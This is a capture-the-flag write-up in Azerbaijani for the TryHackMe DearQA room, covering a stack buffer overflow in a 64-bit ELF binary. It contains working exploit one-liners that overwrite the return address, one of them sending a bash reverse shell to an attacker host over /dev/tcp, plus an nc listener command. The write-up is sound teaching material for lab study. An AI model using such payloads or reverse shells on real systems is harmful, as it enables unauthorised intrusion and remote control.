# TryHackMe — DearQA Writeup

**Çətinlik:** Easy  
**Kateqoriya:** Buffer Overflow / Binary Exploitation  
**Link:** https://tryhackme.com/room/dearqa

---

## Ümumi Məlumat

DearQA klassik bir **stack-based buffer overflow** tapşırığıdır. Məqsəd proqramdakı zəiflikdən istifadə edərək gizli funksiyaya keçid etmək və **flag** əldə etməkdir.

---

## Task 1 — Binary Yüklə

Tapşırıq səhifəsindəki **"Download Task Files"** düyməsinə basıb binary-ni yüklə.

```bash
file DearQA-1627223337406.DearQA
```

**Çıxış:**
```
DearQA-1627223337406.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped
```

---

## Task 2 — Suallar

### Sual 1: Binary-nin arxitekturası nədir?

`file` komandası çıxışına baxırıq:

```
ELF 64-bit LSB executable, x86-64
```

**Cavab: `x86-64` (64-bit)**

---

### Sual 2: Flag nədir?

#### Addım 1 — Binary-i analiz et

```bash
strings DearQA-1627223337406.DearQA
```

Maraqlı satırlar:
```
Congratulations!
You have entered in the secret function!
/bin/bash
Welcome dearQA
What's your name:
vuln
main
```

`/bin/bash` və `vuln` funksiyası var — deməli gizli bir funksiya var ki, shell açır.

---

#### Addım 2 — Funksiya ünvanını tap

```bash
objdump -d DearQA-1627223337406.DearQA | grep "<vuln>"
```

**Çıxış:**
```
0000000000400686 <vuln>:
```

`vuln` funksiyasının ünvanı: **`0x400686`**

---

#### Addım 3 — Buffer ölçüsünü tap

```bash
objdump -d DearQA-1627223337406.DearQA | grep -A 20 "<main>"
```

Main funksiyasında:
```
sub $0x20,%rsp   →  0x20 = 32 byte buffer
```

**Offset hesablaması:**
```
Buffer:  32 byte
RBP:      8 byte
Offset:  40 byte  (32 + 8)
```

---

#### Addım 4 — Exploit

**Metod 1 — Birbaşa flag oxu (ən sadə):**

```bash
python3 -c "
import sys, struct
vuln = struct.pack('<Q', 0x400686)
cmd = b';cat /home/ctf/flag.txt\n'
payload = b'A'*40 + vuln + cmd
sys.stdout.buffer.write(payload)
" | nc <TARGET_IP> 5700
```

**Metod 2 — Reverse Shell:**

1-ci terminaldə listener aç:
```bash
nc -lvnp 4444
```

2-ci terminaldə exploit göndər:
```bash
python3 -c "
import sys, struct
vuln = struct.pack('<Q', 0x400686)
cmd = b';bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1\n'
payload = b'A'*40 + vuln + cmd
sys.stdout.buffer.write(payload)
" | nc <TARGET_IP> 5700
```

Shell açıldıqdan sonra:
```bash
cat flag.txt
```

---

#### Addım 5 — Nəticə

```
Congratulations!
You have entered in the secret function!
ctf@ip-10-81-141-55:/home/ctf$
```

**Flag: `THM{...}`**

---

## Öyrəndiklərimiz

| Mövzu | İzah |
|-------|------|
| Buffer Overflow | Buffer-dən artıq data yazaraq return address-i dəyişmək |
| ELF Binary Analizi | `file`, `strings`, `objdump` alətləri |
| Offset Hesablaması | Buffer + RBP = 32 + 8 = 40 byte |
| Reverse Shell | `bash -i >& /dev/tcp/IP/PORT 0>&1` |

---

## İstifadə Edilən Alətlər

- `file` — binary tipini müəyyən etmək
- `strings` — binary-dəki mətnləri görmək
- `objdump` — assembly kodunu analiz etmək
- `python3` — exploit yazmaq
- `nc (netcat)` — serverə qoşulmaq və listener açmaq

---

*Writeup hazırladı: TryHackMe DearQA Lab*
